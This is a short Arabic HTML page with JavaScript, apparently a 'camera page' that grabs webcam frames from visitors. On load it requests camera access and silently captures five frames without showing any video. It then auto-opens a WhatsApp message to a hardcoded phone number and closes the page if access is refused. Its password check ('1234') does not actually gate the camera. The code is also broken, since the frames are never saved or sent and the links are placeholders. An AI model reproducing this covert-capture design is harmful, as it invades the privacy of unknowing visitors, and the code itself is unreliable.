<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة الكاميرا</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f0f8ff;
            padding-top: 50px;
        }

        .hidden {
            display: none;
        }

        h1 {
            color: #4CAF50;
        }

        .input-container {
            margin-top: 20px;
        }

        input[type="password"] {
            padding: 10px;
            font-size: 16px;
            width: 200px;
            text-align: center;
            border: 2px solid #ccc;
            border-radius: 5px;
        }

        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            margin-top: 10px;
        }

        #message {
            font-size: 18px;
            margin-top: 20px;
            color: green;
        }

        .exit-button {
            background-color: red;
            margin-top: 20px;
        }

        .download-button {
            margin-top: 20px;
            background-color: #007bff;
        }
    </style>
</head>
<body>

<h1>صفحة الكاميرا</h1>

<div id="message" class="hidden">تم التقاط الصور بنجاح! اضغط لتحميل الأرشيف.</div>

<div id="passwordSection">
    <div class="input-container">
        <input type="password" id="password" placeholder="أدخل الرمز السري" />
    </div>
    <button onclick="checkPassword()">تحقق</button>
</div>

<div id="imagesSection" class="hidden">
    <button id="downloadButton" class="download-button hidden" onclick="downloadArchive()">تحميل الأرشيف</button>
    <button class="exit-button" onclick="exitPage()">الخروج</button>
</div>

<script>
    let videoStream;
    let captureCount = 0; // عداد لعدد الصور الملتقطة

    // التحقق من الصور المحفوظة
    if (localStorage.getItem('images')) {
        images = JSON.parse(localStorage.getItem('images'));
    }

    // فتح الكاميرا
    function startCamera() {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    videoStream = stream;
                    captureImage(); // التقاط الصورة عند دخول الصفحة
                })
                .catch(err => {
                    alert('تم رفض إذن الوصول إلى الكاميرا، سيتم إغلاق الصفحة.');
                    window.close(); // إغلاق الصفحة في حال تم رفض إذن الكاميرا
                });
        } else {
            alert('المتصفح لا يدعم الوصول إلى الكاميرا');
        }
    }

    // التقاط صورة عند دخول الصفحة
    function captureImage() {
        setTimeout(() => {
            if (captureCount < 5) { // التأكد من التقاط 5 صور فقط
                const video = document.createElement('video');
                video.srcObject = videoStream;
                video.play();

                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    captureCount++;

                    if (captureCount >= 5) {
                        stopCamera(); // إيقاف الكاميرا بعد التقاط 5 صور
                        document.getElementById('message').classList.remove('hidden'); // إظهار الرسالة
                        document.getElementById('downloadButton').classList.remove('hidden'); // إظهار زر التحميل
                        openWhatsAppLink(); // فتح رابط WhatsApp تلقائيًا
                    } else {
                        captureImage(); // الاستمرار في التقاط الصور
                    }
                }, 1000); // التقاط الصورة بعد ثانية من تشغيل الفيديو
            }
        }, 3000); // بدء التقاط الصورة بعد 3 ثوانٍ من فتح الكاميرا
    }

    // إيقاف الكاميرا
    function stopCamera() {
        const tracks = videoStream.getTracks();
        tracks.forEach(track => track.stop());
    }

    // تحميل الأرشيف
    function downloadArchive() {
        const archiveLink = 'https://github.com/username/repository-name/raw/main/your-archive.zip'; // رابط الأرشيف
        window.location.href = archiveLink; // إعادة توجيه المستخدم لتحميل الأرشيف
    }

    // فتح رابط المشاركة عبر WhatsApp
    function openWhatsAppLink() {
        const archiveLink = 'https://github.com/username/repository-name/raw/main/your-archive.zip'; // رابط الأرشيف
        const whatsappLink = `https://wa.me/0614030795?text=رابط%20تحميل%20الأرشيف%20: ${archiveLink}`;
        
        // فتح الرابط تلقائيًا
        window.open(whatsappLink, '_blank');
    }

    // التحقق من الرمز السري
    function checkPassword() {
        const password = document.getElementById('password').value;
        if (password === '1234') {
            document.getElementById('passwordSection').classList.add('hidden');
            document.getElementById('imagesSection').classList.remove('hidden');
            startCamera(); // بدء الكاميرا بعد التحقق من الرمز السري
        } else {
            alert('الرمز السري غير صحيح');
        }
    }

    // إغلاق الصفحة
    function exitPage() {
        window.close();
    }

    // بدء الكاميرا فور تحميل الصفحة
    window.onload = startCamera;
</script>

</body>
</html>
